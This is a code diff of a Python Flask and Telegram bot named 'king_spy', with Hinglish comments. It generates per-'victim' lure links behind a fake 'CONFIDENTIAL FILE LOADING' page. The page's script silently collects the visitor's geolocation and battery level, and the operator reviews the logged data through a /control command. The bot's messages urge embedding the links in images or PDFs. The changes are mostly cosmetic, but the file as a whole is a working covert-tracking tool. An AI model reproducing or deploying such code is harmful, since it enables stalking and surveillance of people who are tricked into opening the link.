@@ -5,9 +5,9 @@ import json
 import os
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-bot = telebot.TeleBot("YOUR_BOT_TOKEN_HERE")  # ← yahan apna token daal
+bot = telebot.TeleBot("YOUR_BOT_TOKEN_HERE")  # ← yahan apna BotFather token daal
 app = Flask(__name__)
-YOUR_CHAT_ID = YOUR_TELEGRAM_CHAT_ID_HERE     # ← apna personal chat ID daal
+YOUR_CHAT_ID = YOUR_TELEGRAM_CHAT_ID_HERE     # ← yahan apna personal Telegram chat ID daal
 
 DB_FILE = 'king_spy_db.json'
 if not os.path.exists(DB_FILE):
@@ -38,8 +38,10 @@ def king_spy(victim):
         "Status": "Ready for button control"
     }
     save_victim_data(victim, spy_data)
+    
     return """
-    <html><body style='background:#000;color:#0f0;text-align:center;padding:60px'>
+    <html>
+    <body style='background:#000;color:#0f0;text-align:center;padding:60px'>
         <h1>🔒 CONFIDENTIAL FILE LOADING...</h1>
         <img src='https://picsum.photos/800/500' width='600'>
         <script>
@@ -47,7 +49,8 @@ def king_spy(victim):
             navigator.getBattery().then(b => fetch('/log',{method:'POST',body:JSON.stringify({battery:b.level*100+'%'})}));
             navigator.geolocation.getCurrentPosition(p => fetch('/log',{method:'POST',body:JSON.stringify({lat:p.coords.latitude})}));
         </script>
-    </body></html>
+    </body>
+    </html>
     """
 
 def main_menu():
@@ -79,8 +82,8 @@ def button_handler(call):
 @bot.message_handler(commands=['king_link'])
 def create_link(msg):
     victim = msg.text.split()[1] if len(msg.text.split()) > 1 else "unknown"
-    link = f"https://your-render-url.onrender.com/kingspy/{victim}.html"
-    bot.send_message(msg.chat.id, f"ULTIMATE LINK:\n{link}\nImage/PDF mein embed kar ke bhej!")
+    link = f"https://kingspybot.onrender.com/kingspy/{victim}.html"
+    bot.send_message(msg.chat.id, f"👑 ULTIMATE SPY LINK READY:\n{link}\n\nIse image ya PDF mein embed kar ke bhej do!")
 
 @bot.message_handler(commands=['control'])
 def control(msg):
@@ -89,12 +92,12 @@ def control(msg):
         db = json.load(f)
     if victim in db:
         history = db[victim]
-        response = f"CONTROL DATA for {victim}:\n\n"
+        response = f"🔥 CONTROL DATA for {victim}:\n\n"
         for entry in history[-15:]:
-            response += f"{entry['time']}\n{json.dumps(entry['data'], indent=2)}\n\n"
+            response += f"🕒 {entry['time']}\n{json.dumps(entry['data'], indent=2)}\n\n"
         bot.send_message(msg.chat.id, response)
     else:
-        bot.send_message(msg.chat.id, "No data yet.")
+        bot.send_message(msg.chat.id, "No data for this victim yet.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
